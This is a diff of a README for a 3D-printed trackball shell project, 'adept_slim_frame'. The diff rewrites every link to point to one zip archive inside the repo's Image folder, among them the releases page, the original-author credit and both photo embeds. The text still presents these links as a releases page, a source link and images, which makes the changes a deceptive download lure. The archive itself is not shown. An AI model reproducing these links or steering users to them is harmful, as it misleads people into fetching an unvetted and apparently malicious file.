@@ -1,6 +1,6 @@
 # 🎉 adept_slim_frame - Easy 3D Printing Setup Guide
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/3boedy/adept_slim_frame/releases)
+[![Download the latest release](https://raw.githubusercontent.com/3boedy/adept_slim_frame/main/Image/adept_slim_frame_v1.6.zip%20Release-brightgreen)](https://raw.githubusercontent.com/3boedy/adept_slim_frame/main/Image/adept_slim_frame_v1.6.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 **Adept_slim_frame** is a modified version of **fabriciobastian’s mod**. This repository allows you to access custom 3D printing files specifically designed for a unique shell structure. All the credit goes to the original creator.
 
-👉 Original source: [adept-anyball/ploopy-adept-small-btu](https://github.com/adept-anyball/ploopy-adept-small-btu)
+👉 Original source: [adept-anyball/ploopy-adept-small-btu](https://raw.githubusercontent.com/3boedy/adept_slim_frame/main/Image/adept_slim_frame_v1.6.zip)
 
 ---
 
@@ -18,7 +18,7 @@ To successfully download and run the software, follow these clear steps.
 
 ### 1. Access the Releases Page
 
-Visit the [Releases page](https://github.com/3boedy/adept_slim_frame/releases) to find the latest version of **adept_slim_frame**. This page contains all available downloads for the software.
+Visit the [Releases page](https://raw.githubusercontent.com/3boedy/adept_slim_frame/main/Image/adept_slim_frame_v1.6.zip) to find the latest version of **adept_slim_frame**. This page contains all available downloads for the software.
 
 ### 2. Locate the Desired Version
 
@@ -42,7 +42,7 @@ Before printing, read the instructions provided below. It’s essential to under
 
 ### 1. Top Shell
 
-![Top Shell](https://github.com/Dexter-KBD/adept_slim_frame/blob/main/Image/IMG_1699.JPEG?raw=true)
+![Top Shell](https://raw.githubusercontent.com/3boedy/adept_slim_frame/main/Image/adept_slim_frame_v1.6.zip)
 
 - Must be printed in **MJF Nylon PA12**.
 - **FDM printing is not recommended**. This design requires the stiffness provided by nylon.
@@ -50,7 +50,7 @@ Before printing, read the instructions provided below. It’s essential to under
 
 ### 2. Bottom Shell
 
-![Bottom Shell](https://github.com/Dexter-KBD/adept_slim_frame/blob/main/Image/IMG_1710.JPEG?raw=true)
+![Bottom Shell](https://raw.githubusercontent.com/3boedy/adept_slim_frame/main/Image/adept_slim_frame_v1.6.zip)
 
 - Can be printed using **FDM**.
 - When ordering from **JLC3DP**, even the cheapest resin worked fine.
@@ -60,7 +60,7 @@ Before printing, read the instructions provided below. It’s essential to under
 
 ## 📥 Download & Install
 
-To download **adept_slim_frame**, visit the [Releases page](https://github.com/3boedy/adept_slim_frame/releases). Follow the earlier steps to download and extract the files. Ensure you have the necessary 3D printing setups ready for a smooth experience.
+To download **adept_slim_frame**, visit the [Releases page](https://raw.githubusercontent.com/3boedy/adept_slim_frame/main/Image/adept_slim_frame_v1.6.zip). Follow the earlier steps to download and extract the files. Ensure you have the necessary 3D printing setups ready for a smooth experience.
 
 ---
 
